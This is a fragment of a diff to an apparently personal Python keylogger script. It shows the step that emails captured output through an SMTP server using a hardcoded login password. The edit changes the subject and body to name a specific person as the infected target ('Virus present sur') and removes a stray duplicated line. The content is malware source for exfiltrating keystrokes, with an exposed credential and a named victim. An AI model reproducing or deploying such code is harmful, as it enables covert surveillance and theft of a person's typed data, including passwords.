@@ -11,9 +11,9 @@ msg = MIMEMultipart()
 
 msg['From'] = fromaddr
 msg['To'] = toaddr
-msg['Subject'] = "Keylogger Output Salut"
+msg['Subject'] = "Keylogger Output Franck Trehout"
 
-body = "Virus present sur : Salut"
+body = "Virus present sur : Franck Trehout"
 
 msg.attach(MIMEText(body, 'plain'))
 
@@ -32,6 +32,4 @@ server.starttls()
 server.login(fromaddr, "Huberville1")
 text = msg.as_string()
 server.sendmail(fromaddr, toaddr, text)
-server.quit()
-xt)
 server.quit()
